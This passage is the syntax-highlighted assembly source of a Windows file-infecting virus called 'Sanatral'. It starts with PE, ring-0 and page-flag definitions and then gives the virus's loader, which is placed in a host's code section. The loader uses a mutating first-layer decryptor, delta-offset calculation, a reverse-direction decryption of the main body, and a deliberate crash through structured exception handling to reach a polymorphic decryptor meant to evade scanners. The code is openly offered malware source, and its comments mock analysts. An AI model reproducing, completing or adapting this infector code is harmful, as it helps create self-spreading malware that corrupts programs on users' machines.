</span><span class="sc5">R0_FINDNEXTFILE</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04F00h</span><span class="sc0">      </span><span class="sc1">; Do a LFN FindNext operation</span><span class="sc0">
</span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0DC00h</span><span class="sc0">      </span><span class="sc1">; Do a LFN FindClose operation</span><span class="sc0">

</span><span class="sc5">ObjectHeader</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">ObjectName</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc1">; null-padded string identifying section</span><span class="sc0">
</span><span class="sc5">PhysicalSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; physical size</span><span class="sc0">
</span><span class="sc5">RVA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; RVA to be loaded to</span><span class="sc0">
</span><span class="sc5">VirtualSize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; virtual size (physical size rounded up to object alignement)</span><span class="sc0">
</span><span class="sc5">PhysicalOffset</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; offset in file of data</span><span class="sc0">
</span><span class="sc5">Reserved1</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved2</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Reserved3</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Flags</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">; section flags</span><span class="sc0">
</span><span class="sc5">ObjectHeader</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">IMAGE_SCN_MEM_EXECUTE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_MEM_READ</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">

</span><span class="sc5">pfad</span><span class="sc0">    </span><span class="sc9">struc</span><span class="sc0">
  </span><span class="sc5">pfad_edi</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_esi</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_ebp</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_esp</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_ebx</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_edx</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_ecx</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_eax</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_eflags</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">pfad_ret</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pfad</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">pfadsize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0">    </span><span class="sc5">pfad</span><span class="sc0">

</span><span class="sc5">RECT</span><span class="sc0">    </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">x</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">y</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">Width</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Height</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">RECT</span><span class="sc0">    </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">SYSTEMTIME</span><span class="sc0">  </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">wYear</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMonth</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wDayOfWeek</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wDay</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wHour</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMinute</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wSecond</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">wMilliseconds</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">SYSTEMTIME</span><span class="sc0">  </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">; some stuff lifted from VMM.INC</span><span class="sc0">

</span><span class="sc5">Exception_Handler_Struc</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">
</span><span class="sc5">EH_Reserved</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">EH_Start_EIP</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">EH_End_EIP</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">EH_Handler</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Exception_Handler_Struc</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">

</span><span class="sc1">; PR_PRIVATE Or PR_SYSTEM</span><span class="sc0">

</span><span class="sc5">PR_PRIVATE</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000400H</span><span class="sc0">
</span><span class="sc5">PR_SHARED</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80060000H</span><span class="sc0">
</span><span class="sc5">PR_SYSTEM</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80080000H</span><span class="sc0">
</span><span class="sc5">PR_FIXED</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000008H</span><span class="sc0">
</span><span class="sc5">PR_4MEG</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001H</span><span class="sc0">
</span><span class="sc5">PR_STATIC</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000010H</span><span class="sc0">
</span><span class="sc5">PD_ZEROINIT</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001H</span><span class="sc0">
</span><span class="sc5">PD_NOINIT</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000002H</span><span class="sc0">
</span><span class="sc5">PD_FIXEDZERO</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000003H</span><span class="sc0">
</span><span class="sc5">PD_FIXED</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000004H</span><span class="sc0">
</span><span class="sc5">PC_FIXED</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000008H</span><span class="sc0">
</span><span class="sc5">PC_LOCKED</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000080H</span><span class="sc0">
</span><span class="sc5">PC_LOCKEDIFDP</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000100H</span><span class="sc0">
</span><span class="sc5">PC_WRITEABLE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00020000H</span><span class="sc0">
</span><span class="sc5">PC_USER</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00040000H</span><span class="sc0">
</span><span class="sc5">PC_INCR</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">40000000H</span><span class="sc0">
</span><span class="sc5">PC_PRESENT</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">80000000H</span><span class="sc0">
</span><span class="sc5">PC_STATIC</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">20000000H</span><span class="sc0">
</span><span class="sc5">PC_DIRTY</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">08000000H</span><span class="sc0">
</span><span class="sc5">PC_CACHEDIS</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00100000H</span><span class="sc0">
</span><span class="sc5">PC_CACHEWT</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00080000H</span><span class="sc0">
</span><span class="sc5">PC_PAGEFLUSH</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00008000H</span><span class="sc0">
</span><span class="sc5">PCC_ZEROINIT</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">00000001H</span><span class="sc0">
</span><span class="sc5">PCC_NOLIN</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">10000000H</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒ[Sanatral.asm]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; include Sanatral.inc</span><span class="sc0">

</span><span class="sc5">vsize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">mem_vsize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(((</span><span class="sc5">end_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc4">)/</span><span class="sc2">1000h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">mem_vsize_in_pages</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">mem_vsize</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">virus_aligned</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">vsize</span><span class="sc4">/</span><span class="sc2">2048</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">2048</span><span class="sc0">
</span><span class="sc5">file_align</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3FFh</span><span class="sc0">        </span><span class="sc1">; infect files aligned to 1Kb</span><span class="sc0">


</span><span class="sc5">TOPCRYPT</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc2">.586p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FakeEntryPoint</span><span class="sc0">  </span><span class="sc1">; fake a return-EP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; for first generation..</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">         </span><span class="sc1">; program mode = VX 8)</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc0">
</span><span class="sc5">FakeEntryPoint</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">









</span><span class="sc1">;********************************************</span><span class="sc0">
</span><span class="sc1">;********************************************</span><span class="sc0">
</span><span class="sc1">;* Virus 1st decryptors and loader, located *</span><span class="sc0">
</span><span class="sc1">;* in host's CODE section           *</span><span class="sc0">
</span><span class="sc1">;********************************************</span><span class="sc0">
</span><span class="sc1">;********************************************</span><span class="sc0">



</span><span class="sc5">SANATRAL</span><span class="sc0">    </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'SANATRAL'</span><span class="sc0">

</span><span class="sc5">vstart</span><span class="sc4">:</span><span class="sc5">encrypted</span><span class="sc4">:</span><span class="sc5">loader</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;/* Mutated decryptor, starts with 3 byte constant, wich is this virus'</span><span class="sc0">
    </span><span class="sc1">;   longest constant scanstring */</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; store room for return address to host, our 1st decryptor key...</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">; store registers</span><span class="sc0">

    </span><span class="sc1">;/* Get delta a nifty way */</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">01000000h</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">@stackregz</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@dummy</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">@ifix1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; returns @addfix address in ESI, 2 bytes</span><span class="sc0">
</span><span class="sc5">@addfix</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">TopCrypt</span><span class="sc4">-</span><span class="sc5">@addfix</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">@xchgfix</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; for mutation.. (on registers)</span><span class="sc0">
</span><span class="sc5">@ifix2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; 3 bytes, fix stack</span><span class="sc0">

    </span><span class="sc1">;/* Decryptor */</span><span class="sc0">

</span><span class="sc5">@ifix3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">01000000h</span><span class="sc0">
</span><span class="sc5">TopCryptKey</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">; padding for mutation (push, pop)</span><span class="sc0">
</span><span class="sc5">@ifix4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">TopCryptSize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; 5 bytes</span><span class="sc0">
</span><span class="sc5">@ifix5</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">; push  esi, pop edi</span><span class="sc0">
</span><span class="sc5">@ifix6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">dec_algo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">@ifix7</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">@ifix8</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@ifix5</span><span class="sc0">

    </span><span class="sc1">;/*** Encrypted area of virus loader ***/</span><span class="sc0">

    </span><span class="sc1">; Will get delta host, host return address, and decrypt the main virus' top layer</span><span class="sc0">
    </span><span class="sc1">; and main decryptor.</span><span class="sc0">

</span><span class="sc5">TopCrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_delta</span><span class="sc0">
</span><span class="sc5">get_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; Get delta</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">



        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SEH_gnaff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Muehehe</span><span class="sc0">
</span><span class="sc1">;begone suckerz..</span><span class="sc0">
</span><span class="sc5">SEH_gnaff</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; gets the ESP when SEH was set</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01000000h</span><span class="sc0">
</span><span class="sc5">HostPtr</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; stack above PUSHAD holds return address to host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01000000h</span><span class="sc0">
</span><span class="sc5">DiffPtr</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; delta difference between loader and body</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">;/- Decrypt main virus' top layer and main decryptor -/</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">encrypted</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ESI pts to start of encrypted code..</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">91A03F18h</span><span class="sc0">
</span><span class="sc5">MainTopLayerKey</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">lsize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">lsize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; starting at end decrypting forwards</span><span class="sc0">
</span><span class="sc5">dec5</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc5">simple_dec</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; -3 as we're decryptin' dwords byte by byte, -2 as we're going backwards in code</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">dec5</span><span class="sc0">


        </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/- Jmp to main decryptor using SEH -/</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">                      </span><span class="sc1">; save regs 8)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_decrypt</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Muehehe</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; muehehe DebugContext :))</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; store old SEH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">            </span><span class="sc1">; set a new</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">           </span><span class="sc1">; Crash program -&gt; Jump</span><span class="sc0">
</span><span class="sc5">set_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_delta</span><span class="sc0">
</span><span class="sc5">delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">TopCryptSize</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">TopCrypt</span><span class="sc0">
</span><span class="sc5">patchsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc0">

